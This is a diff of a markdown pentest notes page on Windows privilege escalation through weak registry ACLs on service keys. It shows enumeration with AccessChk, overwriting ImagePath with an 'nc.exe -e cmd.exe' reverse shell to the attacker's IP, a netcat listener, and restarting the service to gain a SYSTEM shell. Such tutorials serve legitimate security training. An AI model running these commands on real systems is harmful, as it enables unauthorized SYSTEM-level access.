@@ -1,26 +1,39 @@
 ---
 title: Weak Registry ACLs
 date: 2026-06-19 18:23:48
+
 categories:
   - Active Directory
   - Windows
   - Post-Exploitation
   - Windows Privesc
   - Services
+  
 tags:
-  - Weak-ACL
-  - AccessChk
-  - sc.exe
-  - Windows-Services
   - Weak-Registry-ACLs
   - Modifiable-Registry-Key
   - Registry-Permissions
   - ImagePath
   - KEY_SET_VALUE
+  - Weak-ACL
+  - AccessChk
   - Set-ItemProperty
+  - sc.exe
+  - Windows-Services
+cover: /img/weak-registry-acls.png
+top_img: /img/bg-img.jpg
+description: Identify and exploit weak registry ACLs on Windows service keys to overwrite the ImagePath value, restart the service, and execute arbitrary code as SYSTEM for privilege escalation.
 ---
 
-> ➜ Weak Registry ACLs occur when a low-privileged user has write or full control permissions over a service registry key, allowing them to modify critical values such as `ImagePath`. This allows an attacker to change the service executable to a malicious binary and execute a malicious binary with SYSTEM privileges.
+
+
+
+
+
+
+
+>➜ Weak Registry ACLs occur when a low-privileged user has write or full control permissions over a service registry key, allowing them to modify critical values such as `ImagePath`. This allows an attacker to change the service executable to a malicious binary and execute a malicious binary with SYSTEM privileges.
+
 
 ### Enumerating Weak Registry Permissions
 
@@ -36,7 +49,7 @@ RW HKLM\System\CurrentControlSet\services\BTAGService\Parameters\Settings
         KEY_NOTIFY
         KEY_SET_VALUE
         READ_CONTROL
-<SNIP>
+<SNIP> 
 ```
 
 > ➜ This means the current user has full control over the `ModelManagerService` registry key.
@@ -45,11 +58,12 @@ RW HKLM\System\CurrentControlSet\services\BTAGService\Parameters\Settings
 
 > Since we have write access, we can change the service executable path to a malicious binary:
 
-```plaintext
+```
 PS> Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\<ServiceName>" -Name ImagePath -Value "C:\path\to\nc.exe -e cmd.exe <our-ip> <our-port>"
 ```
 
 > This modifies the service configuration to execute our malicious binary.
+
 
 ## Restarting the Service
 
@@ -69,7 +83,13 @@ C:\WINDOWS\system32> whoami
 nt authority\system
 ```
 
-> ➜ Weak Registry ACLs occur when a low-privileged user has `write` or `full control` permissions over a service’s registry key, allowing them to modify critical values such as `ImagePath`. By pointing `ImagePath` at a malicious binary and restarting the service, an attacker executes code under the service’s account, typically `SYSTEM`.
+
+
+
+
+
+
+> ➜ Weak Registry ACLs occur when a low-privileged user has `write` or `full control` permissions over a service's registry key, allowing them to modify critical values such as `ImagePath`. By pointing `ImagePath` at a malicious binary and restarting the service, an attacker executes code under the service's account, typically `SYSTEM`.
 
 # Enumeration
 
@@ -112,11 +132,13 @@ PS C:\> sc.exe qc <service-name>
 
 > ➜ Since we can write to the service key, we overwrite `ImagePath` to point at our payload. `nc.exe` must already be staged on disk at the path we reference.
 
+
 ```powershell
 PS C:\> Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\<service-name>" -Name ImagePath -Value "C:\Windows\Temp\nc.exe -e cmd.exe ip port"
 ```
 
 #### Starting the Listener
+
 
 ```bash
 rlwrap nc -lvnp port
@@ -124,13 +146,12 @@ rlwrap nc -lvnp port
 
 #### Restarting the Service
 
-> ➜ Restarting forces the service to launch our new `ImagePath` and this needs `SERVICE_STOP` and `SERVICE_START` over the service (or a reboot). A raw `nc` payload isn’t service-aware, so the SCM will time out after ~30 seconds and report a start failure, that’s expected and the shell fires regardless.
+> ➜ Restarting forces the service to launch our new `ImagePath` and this needs `SERVICE_STOP` and `SERVICE_START` over the service (or a reboot). A raw `nc` payload isn't service-aware, so the SCM will time out after ~30 seconds and report a start failure, that's expected and the shell fires regardless.
 
 ```powershell
 PS C:\> sc.exe stop <service-name>
 PS C:\> sc.exe start <service-name>
 ```
-
 #### Getting a SYSTEM Shell
 
 ```bash
